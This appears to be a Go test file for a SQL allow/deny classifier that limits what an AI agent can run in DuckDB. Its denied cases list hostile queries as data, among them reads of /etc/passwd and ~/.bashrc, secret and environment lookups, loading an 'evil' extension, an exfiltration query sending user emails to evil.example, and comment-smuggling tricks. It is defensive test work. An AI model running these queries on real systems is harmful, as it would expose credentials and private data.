package agents

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/SandwichLabs/vibe/internal/session"
)

// expand fills the %DATA% and %OUT% placeholders of a test statement.
func (fx *policyFixture) expand(q string) string {
	q = strings.ReplaceAll(q, "%DATA%", fx.dataDir)
	return strings.ReplaceAll(q, "%OUT%", fx.outside)
}

type policyCase struct {
	name   string
	sql    string
	want   sqlClass
	reason string // substring of the denial reason (denied cases)
}

func runPolicyCases(t *testing.T, fx *policyFixture, cases []policyCase) {
	t.Helper()
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			q := fx.expand(tc.sql)
			v := fx.classify(q)
			assert.Equal(t, tc.want, v.Class, "classify(%q) -> %s (%s)", q, v.Class, v.Reason)
			if tc.want == sqlClassOther {
				assert.NotEmpty(t, v.Reason, "a denial always carries a reason: %q", q)
				if tc.reason != "" {
					assert.Contains(t, strings.ToLower(v.Reason), strings.ToLower(tc.reason), "classify(%q)", q)
				}
			}
		})
	}
}

// TestPolicy_Reads is every shape the agent may read, in every tier.
func TestPolicy_Reads(t *testing.T) {
	fx := newPolicyFixture(t, ModeReadOnly)
	fx.exec(`CREATE VIEW v_ok AS SELECT * FROM read_csv('` + fx.p("x.csv") + `')`)
	fx.exec(`CREATE MACRO m_one() AS 1`)
	fx.exec(`CREATE MACRO t_ok() AS TABLE SELECT * FROM t`)
	runPolicyCases(t, fx, []policyCase{
		{"plain select", "SELECT * FROM t", sqlClassRead, ""},
		{"qualified catalog.table", "SELECT * FROM other.orders", sqlClassRead, ""},
		{"fully qualified", "SELECT * FROM other.main.orders", sqlClassRead, ""},
		{"read-only catalog", "SELECT * FROM ro.ledger", sqlClassRead, ""},
		{"join across catalogs", "SELECT * FROM t JOIN other.users o ON o.uid = t.id", sqlClassRead, ""},
		{"CTE", "WITH x AS (SELECT * FROM other.orders) SELECT * FROM x", sqlClassRead, ""},
		{"nested CTE shadowing a system name", "WITH duckdb_tables AS (SELECT 1 AS a) SELECT * FROM duckdb_tables", sqlClassRead, ""},
		{"CTE reading a data file", "WITH x AS (SELECT * FROM read_csv('%DATA%/x.csv')) SELECT * FROM x", sqlClassRead, ""},
		{"subquery", "SELECT * FROM t WHERE id IN (SELECT id FROM t2)", sqlClassRead, ""},
		{"from-first", "FROM t", sqlClassRead, ""},
		{"values", "VALUES (1), (2)", sqlClassRead, ""},
		{"show tables", "SHOW TABLES", sqlClassRead, ""},
		{"show all tables", "SHOW ALL TABLES", sqlClassRead, ""},
		{"describe a table", "DESCRIBE other.orders", sqlClassRead, ""},
		{"summarize a local table", "SUMMARIZE other.orders", sqlClassRead, ""},
		{"explain", "EXPLAIN SELECT * FROM t", sqlClassRead, ""},
		{"explain with format", "EXPLAIN (FORMAT JSON) SELECT * FROM t", sqlClassRead, ""},
		{"pragma table_info", "PRAGMA table_info('t')", sqlClassRead, ""},
		{"pragma database_size", "PRAGMA database_size", sqlClassRead, ""},
		{"call catalog function", "CALL duckdb_tables()", sqlClassRead, ""},
		{"information_schema", "SELECT * FROM information_schema.tables", sqlClassRead, ""},
		{"duckdb_columns", "SELECT * FROM duckdb_columns()", sqlClassRead, ""},
		{"range", "SELECT * FROM range(5)", sqlClassRead, ""},
		{"path-looking value in WHERE", "SELECT * FROM t WHERE name = '/home/x/a.csv'", sqlClassRead, ""},
		{"url pattern in LIKE", "SELECT * FROM t WHERE name LIKE 'https://%'", sqlClassRead, ""},
		{"extension pattern in LIKE", "SELECT * FROM t WHERE name LIKE '%.csv'", sqlClassRead, ""},
		{"file-like label", "SELECT 'report.csv' AS label", sqlClassRead, ""},
		{"regexp over a path column", "SELECT regexp_extract(name, '/([^/]+)$', 1) FROM t", sqlClassRead, ""},
		{"URL literal in ORDER BY of a read", "SELECT id, 'https://x/y.parquet' AS u FROM t2", sqlClassRead, ""},
		{"subquery source in a CTAS", "CREATE TABLE zq AS SELECT * FROM (FROM t2)", sqlClassDDL, ""},
		{"literal value that is inert", "SELECT 'N/A' AS h, 'a/b' AS i, '%/etc/%' AS j", sqlClassRead, ""},
		{"nested block comments (DuckDB nests them, so the ATTACH is only text)", "SELECT 1 /* a /* b */ ; ATTACH 'x.db' AS x */", sqlClassRead, ""},
		{"comment mentioning attach", "SELECT 1 /* ATTACH 'x' */ -- LOAD x\n", sqlClassRead, ""},
		{"string mentioning drop", "SELECT 'DROP TABLE t; ATTACH x' AS note", sqlClassRead, ""},
		{"multi-statement of reads", "SELECT 1; SELECT * FROM t", sqlClassRead, ""},
		{"scalar macro", "SELECT m_one()", sqlClassRead, ""},
		{"table macro over a table", "SELECT * FROM t_ok()", sqlClassRead, ""},
		{"view over a data file", "SELECT * FROM v_ok", sqlClassRead, ""},
		{"query() with a literal read", "SELECT * FROM query('SELECT * FROM t')", sqlClassRead, ""},

		// Files, only as a literal absolute path inside data/.
		{"read_csv in data", "SELECT * FROM read_csv('%DATA%/x.csv')", sqlClassRead, ""},
		{"read_csv with options", "SELECT * FROM read_csv('%DATA%/x.csv', header = true, columns = {'a': 'INTEGER', 'b': 'INTEGER'})", sqlClassRead, ""},
		{"read_csv_auto", "SELECT * FROM read_csv_auto('%DATA%/x.csv')", sqlClassRead, ""},
		{"read_csv glob in a subfolder", "SELECT * FROM read_csv('%DATA%/sub/*.csv')", sqlClassRead, ""},
		{"read_csv in a subfolder", "SELECT * FROM read_csv('%DATA%/sub/z.csv')", sqlClassRead, ""},
		{"read_text in data", "SELECT * FROM read_text('%DATA%/x.csv')", sqlClassRead, ""},
		{"read_blob in data", "SELECT * FROM read_blob('%DATA%/x.csv')", sqlClassRead, ""},
		{"glob in data", "SELECT * FROM glob('%DATA%/sub/*')", sqlClassRead, ""},
		{"replacement scan in data", "SELECT * FROM '%DATA%/x.csv'", sqlClassRead, ""},
		{"bare FROM replacement scan in data", "FROM '%DATA%/x.csv'", sqlClassRead, ""},
		{"describe a data file", "DESCRIBE '%DATA%/x.csv'", sqlClassRead, ""},
		{"summarize a data file", "SUMMARIZE '%DATA%/x.csv'", sqlClassRead, ""},
		{"describe a select over a data file", "DESCRIBE SELECT * FROM read_csv('%DATA%/x.csv')", sqlClassRead, ""},
		{"quoted function name", `SELECT * FROM "read_csv"('%DATA%/x.csv')`, sqlClassRead, ""},
		{"mixed case and comments", "SeLeCt * FrOm /* a */ ReAd_CsV /* b */ ( /* c */ '%DATA%/x.csv' /* d */ ) -- e\n", sqlClassRead, ""},
		{"two data files joined", "SELECT * FROM read_csv('%DATA%/x.csv') a JOIN read_csv('%DATA%/y.csv') b ON a.a = b.a", sqlClassRead, ""},
		{"file read feeding a join with a table", "SELECT * FROM t JOIN read_csv('%DATA%/x.csv') c ON c.a = t.id", sqlClassRead, ""},
		{"query() with a vetted file", "SELECT * FROM query('SELECT * FROM read_csv(''%DATA%/x.csv'')')", sqlClassRead, ""},
	})
}

// TestPolicy_Denied is everything that is refused in every tier, with the
// reason: the never-list, the spike #107 findings A-K, comment/case/quote
// tricks, views and macros wrapping a denied function, and every path rule.
func TestPolicy_Denied(t *testing.T) {
	fx := newPolicyFixture(t, ModeFull)
	// Objects an owner could have created that wrap a denied function.
	fx.exec(`CREATE VIEW v_secrets AS SELECT * FROM duckdb_secrets()`)
	fx.exec(`CREATE VIEW v_text AS SELECT * FROM read_text('` + fx.outside + `/secret.txt')`)
	fx.exec(`CREATE VIEW v_text2 AS SELECT * FROM v_text`)
	fx.exec(`CREATE VIEW v_set AS SELECT current_setting('home_directory') AS h`)
	fx.exec(`CREATE VIEW v_dbs AS SELECT * FROM duckdb_databases()`)
	fx.exec(`CREATE MACRO m_file() AS (SELECT content FROM read_text('` + fx.outside + `/secret.txt'))`)
	fx.exec(`CREATE MACRO t_file() AS TABLE SELECT * FROM read_text('` + fx.outside + `/secret.txt')`)
	fx.exec(`CREATE MACRO m_set() AS current_setting('home_directory')`)
	fx.exec(`CREATE MACRO m_wrap() AS m_set()`)

	runPolicyCases(t, fx, []policyCase{
		// --- The never-list: statement kinds.
		{"ATTACH", "ATTACH 'x.db' AS x", sqlClassOther, "attach"},
		{"ATTACH md share", "ATTACH 'md:_share/x/abc'", sqlClassOther, "attach"},
		{"ATTACH with type", "ATTACH 'host=h' AS p (TYPE postgres)", sqlClassOther, "attach"},
		{"DETACH", "DETACH other", sqlClassOther, "detach"},
		{"USE", "USE other", sqlClassOther, "use"},
		{"SET", "SET memory_limit = '1GB'", sqlClassOther, "set"},
		{"SET enable_external_access", "SET enable_external_access = true", sqlClassOther, "set"},
		{"SET lowercase", "set threads = 1", sqlClassOther, "set"},
		{"RESET", "RESET memory_limit", sqlClassOther, "reset"},
		{"SET VARIABLE constant (denied entirely)", "SET VARIABLE v = 1", sqlClassOther, "set"},
		{"SET VARIABLE with a subquery (finding D)", "SET VARIABLE v = (SELECT content FROM read_text('/etc/hostname'))", sqlClassOther, "set"},
		{"PRAGMA assignment", "PRAGMA memory_limit = '1GB'", sqlClassOther, "pragma"},
		{"PRAGMA enable_profiling", "PRAGMA enable_profiling", sqlClassOther, "pragma"},
		{"PRAGMA database_list", "PRAGMA database_list", sqlClassOther, "pragma"},
		{"PRAGMA with non-literal args", "PRAGMA table_info(getenv('HOME'))", sqlClassOther, "verify"},
		{"INSTALL", "INSTALL httpfs", sqlClassOther, "install"},
		{"INSTALL path (finding E)", "INSTALL '/tmp/evil.duckdb_extension'", sqlClassOther, "install"},
		{"LOAD", "LOAD httpfs", sqlClassOther, "load"},
		{"LOAD path (finding E)", "LOAD '/tmp/evil.duckdb_extension'", sqlClassOther, "load"},
		{"FORCE INSTALL", "FORCE INSTALL httpfs", sqlClassOther, "install"},
		{"EXPORT DATABASE", "EXPORT DATABASE '/tmp/dump'", sqlClassOther, "export"},
		{"IMPORT DATABASE", "IMPORT DATABASE '/tmp/dump'", sqlClassOther, "import"},
		{"COPY FROM DATABASE (finding E)", "COPY FROM DATABASE other TO local", sqlClassOther, "copy"},
		{"CHECKPOINT", "CHECKPOINT", sqlClassOther, "checkpoint"},
		{"VACUUM", "VACUUM", sqlClassOther, "vacuum"},
		{"ANALYZE", "ANALYZE", sqlClassOther, "analyze"},
		{"BEGIN", "BEGIN TRANSACTION", sqlClassOther, "transaction"},
		{"COMMIT", "COMMIT", sqlClassOther, "transaction"},
		{"PREPARE", "PREPARE p AS SELECT 1", sqlClassOther, "prepare"},
		{"EXECUTE", "EXECUTE p", sqlClassOther, "prepare"},
		{"TRUNCATE", "TRUNCATE t", sqlClassOther, "truncate"},
		{"unknown statement", "frobnicate t", sqlClassOther, "verify"},
		{"empty", "", sqlClassOther, "empty"},
		{"whitespace only", "  \n\t ", sqlClassOther, "empty"},
		{"comment only", "-- nothing", sqlClassOther, "empty"},
		{"syntax error", "SELECT FROM WHERE", sqlClassOther, "verify"},

		// --- Secrets (the #114 semantics, now also through the AST).
		{"CREATE SECRET", "CREATE SECRET s (TYPE s3, KEY_ID 'a', SECRET 'b')", sqlClassOther, "secrets are managed"},
		{"CREATE PERSISTENT SECRET", "CREATE PERSISTENT SECRET s (TYPE s3)", sqlClassOther, "secrets are managed"},
		{"DROP SECRET", "DROP SECRET s", sqlClassOther, "secrets are managed"},
		{"duckdb_secrets()", "SELECT * FROM duckdb_secrets()", sqlClassOther, "secrets are managed"},
		{"which_secret", "SELECT which_secret('s3://b/x', 's3')", sqlClassOther, "secrets are managed"},
		{"duckdb_secrets quoted", `SELECT * FROM "duckdb_secrets"()`, sqlClassOther, "secrets are managed"},
		{"ATTACH with SECRET", "ATTACH '' AS p (TYPE postgres, SECRET s)", sqlClassOther, "secrets are managed"},

		// --- EXPLAIN ANALYZE executes (finding A).
		{"EXPLAIN ANALYZE select", "EXPLAIN ANALYZE SELECT 1", sqlClassOther, "analyze"},
		{"EXPLAIN ANALYZE INSERT", "EXPLAIN ANALYZE INSERT INTO t VALUES (9, 'x')", sqlClassOther, "analyze"},
		{"EXPLAIN ANALYZE CTAS", "EXPLAIN ANALYZE CREATE TABLE zz AS SELECT 1", sqlClassOther, "analyze"},
		{"EXPLAIN ANALYZE COPY", "EXPLAIN ANALYZE COPY (SELECT 1) TO '%DATA%/o.csv'", sqlClassOther, "analyze"},
		{"EXPLAIN (ANALYZE)", "EXPLAIN (ANALYZE) SELECT 1", sqlClassOther, "explain"},
		{"EXPLAIN (FORMAT JSON, ANALYZE)", "EXPLAIN (FORMAT JSON, ANALYZE) SELECT 1", sqlClassOther, "explain"},
		{"EXPLAIN of a write", "EXPLAIN INSERT INTO t VALUES (9, 'x')", sqlClassOther, "only allowed over a read"},

		// --- Raw passthroughs.
		{"postgres_query", "SELECT * FROM postgres_query('other', 'select 1')", sqlClassOther, "postgres_query"},
		{"postgres_execute", "CALL postgres_execute('other', 'ROLLBACK; CREATE TABLE x(a int)')", sqlClassOther, "postgres_execute"},
		{"postgres_execute as table fn", "SELECT * FROM postgres_execute('other', 'ROLLBACK; CREATE TABLE x(a int)')", sqlClassOther, "postgres_execute"},
		{"postgres_scan inline dsn", "SELECT * FROM postgres_scan('host=h password=p', 'public', 't')", sqlClassOther, "postgres_scan"},
		{"postgres_attach", "CALL postgres_attach('host=h')", sqlClassOther, "postgres_attach"},
		{"mysql_query", "SELECT * FROM mysql_query('x', 'select 1')", sqlClassOther, "mysql_query"},
		{"sqlite_scan with a path", "SELECT * FROM sqlite_scan('/tmp/x.db', 't')", sqlClassOther, "sqlite_scan"},
		{"sqlite_attach", "CALL sqlite_attach('/tmp/x.db')", sqlClassOther, "sqlite_attach"},
		{"pg_clear_cache", "CALL pg_clear_cache()", sqlClassOther, "pg_clear_cache"},
		{"query() concatenation (finding C)", "SELECT * FROM query('SELECT * FROM read_text(''' || '/etc/' || 'hostname' || ''')')", sqlClassOther, "query"},
		{"query() of a variable", "SELECT * FROM query(getvariable('q'))", sqlClassOther, "query"},
		{"query() with a denied literal", "SELECT * FROM query('SELECT * FROM read_text(''/etc/hostname'')')", sqlClassOther, ""},
		{"query() running DDL", "SELECT * FROM query('DROP TABLE t')", sqlClassOther, ""},
		{"query_table non literal", "SELECT * FROM query_table(getvariable('n'))", sqlClassOther, "query_table"},
		{"query_table list", "SELECT * FROM query_table(['t', 't2'])", sqlClassOther, "query_table"},
		{"json_execute_serialized_sql", "SELECT * FROM json_execute_serialized_sql('{}')", sqlClassOther, "json_execute"},

		// --- MotherDuck sharing and administration.
		{"md_databases", "SELECT * FROM md_databases()", sqlClassOther, "motherduck"},
		{"MD_ALL_DATABASES upper", "SELECT * FROM MD_ALL_DATABASES()", sqlClassOther, "motherduck"},
		{"md_create_database_share", "SELECT * FROM md_create_database_share('db')", sqlClassOther, "motherduck"},
		{"md_drop_database", "CALL md_drop_database('db')", sqlClassOther, "allow-list"},
		{"motherduck_ prefix", "SELECT motherduck_anything()", sqlClassOther, "motherduck"},
		{"get_md_token", "SELECT * FROM get_md_token()", sqlClassOther, "motherduck"},
		{"prompt() sends data out", "SELECT prompt('hi ' || name) FROM t", sqlClassOther, "motherduck"},
		{"embedding()", "SELECT embedding(name) FROM t", sqlClassOther, "motherduck"},
		{"CREATE SHARE", "CREATE SHARE s FROM other", sqlClassOther, "share"},
		{"CREATE DATABASE", "CREATE DATABASE d", sqlClassOther, "database"},
		{"DROP DATABASE", "DROP DATABASE other", sqlClassOther, "database"},
		// DuckDB 1.5 no longer parses ALTER DATABASE ... RENAME, so it is refused as unverifiable (still denied).
		{"ALTER DATABASE", "ALTER DATABASE other RENAME TO o2", sqlClassOther, "verify"},
		{"CREATE EXTENSION-like", "CREATE EXTENSION foo", sqlClassOther, "extension"},

		// --- Settings, environment, catalog internals.
		{"duckdb_settings()", "SELECT * FROM duckdb_settings()", sqlClassOther, "settings"},
		{"duckdb_settings bare", "SELECT * FROM duckdb_settings", sqlClassOther, ""},
		{"pg_settings", "SELECT * FROM pg_settings", sqlClassOther, ""},
		{"current_setting", "SELECT current_setting('home_directory')", sqlClassOther, "settings"},
		{"current_setting in WHERE", "SELECT * FROM t WHERE name = current_setting('x')", sqlClassOther, "settings"},
		{"getenv", "SELECT getenv('HOME')", sqlClassOther, "environment"},
		{"sleep_ms", "SELECT sleep_ms(1)", sqlClassOther, "sleeping"},
		{"pg_sleep", "SELECT pg_sleep(1)", sqlClassOther, "sleeping"},
		{"duckdb_extensions()", "SELECT * FROM duckdb_extensions()", sqlClassOther, "settings"},
		{"duckdb_databases() (paths)", "SELECT * FROM duckdb_databases()", sqlClassOther, "list_connections"},
		{"duckdb_databases projection", "SELECT database_name FROM duckdb_databases()", sqlClassOther, "list_connections"},
		{"pragma_database_list", "SELECT * FROM pragma_database_list()", sqlClassOther, ""},
		{"duckdb_variables()", "SELECT * FROM duckdb_variables()", sqlClassOther, ""},
		{"duckdb_logs", "SELECT * FROM duckdb_logs", sqlClassOther, ""},
		{"duckdb_temporary_files", "SELECT * FROM duckdb_temporary_files()", sqlClassOther, ""},
		{"duckdb_external_file_cache", "SELECT * FROM duckdb_external_file_cache()", sqlClassOther, ""},
		{"sql_auto_complete", "SELECT * FROM sql_auto_complete('SEL')", sqlClassOther, ""},
		{"SHOW DATABASES", "SHOW DATABASES", sqlClassOther, "show"},
		{"nextval", "SELECT nextval('s')", sqlClassOther, "nextval"},
		{"table function not on the list", "SELECT * FROM checkpoint()", sqlClassOther, "allow-list"},
		{"read_xlsx not listed", "SELECT * FROM read_xlsx('%DATA%/x.xlsx')", sqlClassOther, "allow-list"},
		{"sniff_csv not listed", "SELECT * FROM sniff_csv('%DATA%/x.csv')", sqlClassOther, "allow-list"},
		{"parquet_bloom_probe not listed", "SELECT * FROM parquet_bloom_probe('%DATA%/x.parquet', 'a', 1)", sqlClassOther, "allow-list"},
		{"st_read not listed", "SELECT * FROM st_read('%DATA%/x.shp')", sqlClassOther, ""},
		{"iceberg_scan not listed", "SELECT * FROM iceberg_scan('%DATA%/x')", sqlClassOther, ""},
		{"delta_scan not listed", "SELECT * FROM delta_scan('%DATA%/x')", sqlClassOther, ""},

		// --- CALL outside the allow-list (finding E: CALL read_text).
		{"CALL read_text", "CALL read_text('/etc/hostname')", sqlClassOther, "call"},
		{"CALL read_text in data", "CALL read_text('%DATA%/x.csv')", sqlClassOther, "call"},
		{"CALL glob", "CALL glob('/etc/*')", sqlClassOther, "call"},
		{"CALL duckdb_secrets", "CALL duckdb_secrets()", sqlClassOther, "secrets are managed"},
		{"CALL checkpoint", "CALL checkpoint()", sqlClassOther, "call"},
		{"CALL with a non-literal argument", "CALL duckdb_tables(getenv('x'))", sqlClassOther, "literal"},
		{"CALL pragma_database_list", "CALL pragma_database_list()", sqlClassOther, "call"},

		// --- File and URL reads that are not a plain literal path inside data/.
		{"read_csv /etc/passwd", "SELECT * FROM read_csv('/etc/passwd')", sqlClassOther, "outside"},
		{"read_text hostname", "SELECT * FROM read_text('/etc/hostname')", sqlClassOther, "outside"},
		{"read_text on ~/.bashrc", "SELECT * FROM read_text('~/.bashrc')", sqlClassOther, "relative"},
		{"read_text on an absolute .bashrc", "SELECT * FROM read_text('/home/user/.bashrc')", sqlClassOther, "outside"},
		{"read_blob scalar form", "SELECT read_blob('%DATA%/x.csv')", sqlClassOther, "table"},
		{"read_csv relative path", "SELECT * FROM read_csv('x.csv')", sqlClassOther, "relative"},
		{"read_csv data/ relative", "SELECT * FROM read_csv('data/x.csv')", sqlClassOther, "relative"},
		{"read_csv with ..", "SELECT * FROM read_csv('%DATA%/../outside/secret.csv')", sqlClassOther, ".."},
		{"read_csv with .. mid-path", "SELECT * FROM read_csv('%DATA%/sub/../../outside/secret.csv')", sqlClassOther, ".."},
		{"read_csv outside the workspace", "SELECT * FROM read_csv('%OUT%/secret.csv')", sqlClassOther, "outside"},
		{"read_csv via a symlink in data", "SELECT * FROM read_csv('%DATA%/link.csv')", sqlClassOther, "outside"},
		{"read_csv glob over a dir with an escaping symlink", "SELECT * FROM read_csv('%DATA%/*.csv')", sqlClassOther, "symlink"},
		{"glob outside", "SELECT * FROM glob('%OUT%/*')", sqlClassOther, "outside"},
		{"glob of the filesystem root", "SELECT * FROM glob('/*')", sqlClassOther, "outside"},
		{"data dir prefix lookalike", "SELECT * FROM read_csv('%DATA%-evil/x.csv')", sqlClassOther, "outside"},
		{"file:// URL", "SELECT * FROM read_text('file://%OUT%/secret.txt')", sqlClassOther, "url"},
		{"https URL (no storage connections)", "SELECT * FROM read_csv('https://example.com/x.csv')", sqlClassOther, "url"},
		{"http URL with data", "SELECT * FROM read_csv('http://127.0.0.1:1/leak?d=1')", sqlClassOther, "url"},
		{"s3 URL without a storage connection", "SELECT * FROM read_parquet('s3://bucket/x.parquet')", sqlClassOther, "url"},
		{"exfiltration (the issue's example)", "SELECT * FROM read_text('https://evil.example/?d=' || (SELECT string_agg(email, ',') FROM users))", sqlClassOther, "plain string literal"},
		{"path from getvariable (finding C)", "SELECT * FROM read_csv(getvariable('p'))", sqlClassOther, "plain string literal"},
		{"path from concatenation", "SELECT * FROM read_csv('%DATA%/' || 'x.csv')", sqlClassOther, "plain string literal"},
		{"path from a cast", "SELECT * FROM read_csv('%DATA%/x.csv'::VARCHAR)", sqlClassOther, "plain string literal"},
		{"path from a column", "SELECT * FROM t, read_csv(t.name)", sqlClassOther, "plain string literal"},
		{"path as a list", "SELECT * FROM read_csv(['%DATA%/x.csv', '%DATA%/y.csv'])", sqlClassOther, "plain string literal"},
		{"two positional paths", "SELECT * FROM read_csv('%DATA%/x.csv', '%DATA%/y.csv')", sqlClassOther, "one path"},
		{"adjacent literals concatenate", "SELECT * FROM read_csv('%DATA%/x.csv'\n'/../../etc/passwd')", sqlClassOther, "plain string literal"},
		{"E'' escape string path", "SELECT * FROM read_csv(E'%DATA%/x.csv')", sqlClassOther, "plain string literal"},
		{"dollar-quoted path", "SELECT * FROM read_csv($$%DATA%/x.csv$$)", sqlClassOther, "plain string literal"},
		{"unicode-escape path U&''", "SELECT * FROM read_csv(U&'%DATA%/x.csv')", sqlClassOther, "unicode"},
		{"path as a parameter placeholder", "SELECT * FROM read_csv(?)", sqlClassOther, ""},
		{"read_csv with no arguments", "SELECT * FROM read_csv()", sqlClassOther, "path"},
		{"replacement scan outside", "SELECT * FROM '/tmp/x.csv'", sqlClassOther, "outside"},
		{"replacement scan relative", "SELECT * FROM 'data/sales.parquet'", sqlClassOther, "relative"},
		{"replacement scan via a quoted identifier", `SELECT * FROM "/tmp/x.csv"`, sqlClassOther, "outside"},
		{"replacement scan schema.table disguise", "SELECT * FROM s.csv", sqlClassOther, "relative"},
		{"replacement scan .tsv", "SELECT * FROM 's.tsv'", sqlClassOther, "relative"},
		{"replacement scan http", "SELECT * FROM 'https://example.com/x.csv'", sqlClassOther, "url"},
		{"DESCRIBE a file outside (finding E)", "DESCRIBE '/etc/passwd.csv'", sqlClassOther, "outside"},
		{"SUMMARIZE a file outside", "SUMMARIZE '/etc/x.csv'", sqlClassOther, "outside"},
		{"SHOW a file outside", "SHOW '/etc/x.csv'", sqlClassOther, "outside"},
		{"DESCRIBE a select over an outside file", "DESCRIBE SELECT * FROM read_csv('/etc/passwd')", sqlClassOther, "outside"},
		{"PIVOT statement on a file (finding E)", "PIVOT '/etc/x.csv' ON a USING sum(b)", sqlClassOther, ""},
		{"read_csv in a CTE", "WITH a AS (SELECT * FROM read_text('/etc/hostname')) SELECT * FROM a", sqlClassOther, "outside"},
		{"read_csv in a scalar subquery", "SELECT (SELECT content FROM read_text('/etc/hostname'))", sqlClassOther, "outside"},
		{"read_csv in a WHERE subquery", "SELECT * FROM t WHERE name IN (SELECT content FROM read_text('/etc/hostname'))", sqlClassOther, "outside"},
		{"unknown table", "SELECT * FROM customers", sqlClassOther, `table "customers" not found`},
		{"DESCRIBE unknown table", "DESCRIBE nonexistent_table", sqlClassOther, `not found`},

		// --- Views and macros that wrap a denied function (the plan layer).
		{"view over duckdb_secrets()", "SELECT * FROM v_secrets", sqlClassOther, "secrets"},
		{"view over read_text outside", "SELECT * FROM v_text", sqlClassOther, "outside"},
		{"view of a view over read_text", "SELECT * FROM v_text2", sqlClassOther, "outside"},
		{"view over current_setting", "SELECT * FROM v_set", sqlClassOther, "settings"},
		{"view over duckdb_databases", "SELECT * FROM v_dbs", sqlClassOther, "list_connections"},
		{"scalar macro over read_text", "SELECT m_file()", sqlClassOther, "outside"},
		{"table macro over read_text", "SELECT * FROM t_file()", sqlClassOther, "outside"},
		{"macro over current_setting", "SELECT m_set()", sqlClassOther, "settings"},
		{"macro calling a macro", "SELECT m_wrap()", sqlClassOther, "settings"},
		{"view in a join", "SELECT * FROM t JOIN v_text ON true", sqlClassOther, "outside"},
		{"view inside a CTE", "WITH a AS (SELECT * FROM v_text) SELECT * FROM a", sqlClassOther, "outside"},
		{"view feeding an INSERT", "INSERT INTO t SELECT 1, content FROM v_text", sqlClassOther, "outside"},
		{"macro feeding an UPDATE", "UPDATE t SET name = m_file()", sqlClassOther, "outside"},

		// --- Writes and DDL hiding a denied read.
		{"INSERT SELECT read_csv", "INSERT INTO t SELECT * FROM read_csv('/etc/passwd')", sqlClassOther, "outside"},
		{"INSERT SELECT read_text", "INSERT INTO t SELECT 1, content FROM read_text('/etc/hostname')", sqlClassOther, "outside"},
		{"INSERT FROM replacement scan", "INSERT INTO t FROM '/tmp/x.csv'", sqlClassOther, "outside"},
		{"INSERT SELECT FROM quoted file", "INSERT INTO t SELECT * FROM 's.csv'", sqlClassOther, "relative"},
		{"INSERT from a computed path", "INSERT INTO t SELECT * FROM read_csv(getvariable('p'))", sqlClassOther, "plain string literal"},
		{"CTE over read_text feeding INSERT", "WITH x AS (SELECT * FROM read_text('/etc/hostname')) INSERT INTO t SELECT 1, content FROM x", sqlClassOther, "outside"},
		{"UPDATE from a file", "UPDATE t SET name = x.b FROM read_csv('/etc/passwd') AS x", sqlClassOther, "outside"},
		{"UPDATE from a replacement scan", "UPDATE t SET name = x.b FROM '/etc/x.csv' AS x", sqlClassOther, "outside"},
		{"UPDATE value from a read", "UPDATE t SET name = (SELECT content FROM read_text('/etc/hostname'))", sqlClassOther, "outside"},
		{"DELETE with a file subquery", "DELETE FROM t WHERE name IN (SELECT content FROM read_text('/etc/hostname'))", sqlClassOther, "outside"},
		{"DELETE USING a file", "DELETE FROM t USING '/etc/x.csv' AS x WHERE x.a = t.id", sqlClassOther, "outside"},
		{"MERGE USING a file", "MERGE INTO t USING '/etc/x.csv' AS s ON s.a = t.id WHEN MATCHED THEN UPDATE SET name = 'x'", sqlClassOther, "outside"},
		{"CTAS from read_csv", "CREATE TABLE zz AS SELECT * FROM read_csv('/etc/passwd')", sqlClassOther, "outside"},
		{"CTAS from a URL", "CREATE TABLE zz AS SELECT * FROM read_csv('https://example.com/x.csv')", sqlClassOther, "url"},
		{"CREATE VIEW over getenv", "CREATE VIEW vv AS SELECT getenv('HOME')", sqlClassOther, "environment"},
		{"CREATE VIEW over read_text", "CREATE VIEW vv AS SELECT * FROM read_text('/etc/hostname')", sqlClassOther, "outside"},
		{"CREATE MACRO over read_text", "CREATE MACRO mm() AS (SELECT content FROM read_text('/etc/hostname'))", sqlClassOther, "outside"},
		{"CREATE MACRO over getenv", "CREATE MACRO mm() AS getenv('X')", sqlClassOther, "environment"},
		{"CREATE TABLE MACRO over a denied function", "CREATE MACRO mm() AS TABLE SELECT * FROM duckdb_secrets()", sqlClassOther, "secrets"},
		{"CREATE TABLE with a denied default", "CREATE TABLE zz (a VARCHAR DEFAULT getenv('HOME'))", sqlClassOther, "environment"},
		{"COPY to outside", "COPY (SELECT 1) TO '/tmp/leak.csv'", sqlClassOther, "must be inside"},
		{"COPY to relative", "COPY t TO 'out.csv'", sqlClassOther, "absolute"},
		{"COPY to .. in data", "COPY t TO '%DATA%/../out.csv'", sqlClassOther, ".."},
		{"COPY to a URL", "COPY t TO 's3://bucket/x.csv'", sqlClassOther, "data/"},
		{"COPY to a symlink", "COPY t TO '%DATA%/link.csv'", sqlClassOther, "symlink"},
		{"COPY to a computed path", "COPY t TO getvariable('p')", sqlClassOther, "verify"},
		{"COPY FROM a file", "COPY t FROM '%DATA%/x.csv'", sqlClassOther, "copy"},
		{"COPY query reading a file outside", "COPY (SELECT * FROM read_text('/etc/hostname')) TO '%DATA%/o.csv'", sqlClassOther, "outside"},

		// --- Scripts: every statement is checked.
		{"read then ATTACH", "SELECT 1; ATTACH 'x.db' AS x", sqlClassOther, "attach"},
		{"read then SET", "SELECT 1; SET memory_limit='1GB'", sqlClassOther, "set"},
		{"read then a file read outside", "SELECT 1; SELECT * FROM read_text('/etc/hostname')", sqlClassOther, "outside"},
		{"dollar-quote smuggled ATTACH", "SELECT $$'$$ AS probe; ATTACH 'x.db' AS x; --'", sqlClassOther, "attach"},
		{"E'' escape smuggled ATTACH", `SELECT E'\'' AS probe; ATTACH 'x.db' AS x; --'`, sqlClassOther, "attach"},
		{"a CR ends a line comment and exposes a reader", "INSERT INTO t SELECT 1, 'x' FROM t2 -- hidden?\r, read_csv('/etc/passwd')", sqlClassOther, "outside"},
		{"a CR ends a line comment before ATTACH-like text", "SELECT 1 -- x\r; ATTACH 'x.db' AS x", sqlClassOther, "attach"},
		{"a CR comment hiding a denied function", "UPDATE t SET name = 'a' -- x\r, id = (SELECT count(*) FROM read_text('/etc/hostname'))", sqlClassOther, "outside"},
		{"U& escaped identifier", `INSERT INTO t SELECT 1, content FROM U&"read\005ftext"('/etc/hostname')`, sqlClassOther, "unicode"},
		// The string net: a literal shaped like a file or URL is refused anywhere
		// it is not an accepted reader path, whatever the statement shape.
		{"net: path-looking value is refused (blunt)", "INSERT INTO t VALUES (3, '/etc/passwd')", sqlClassOther, "can't be checked"},
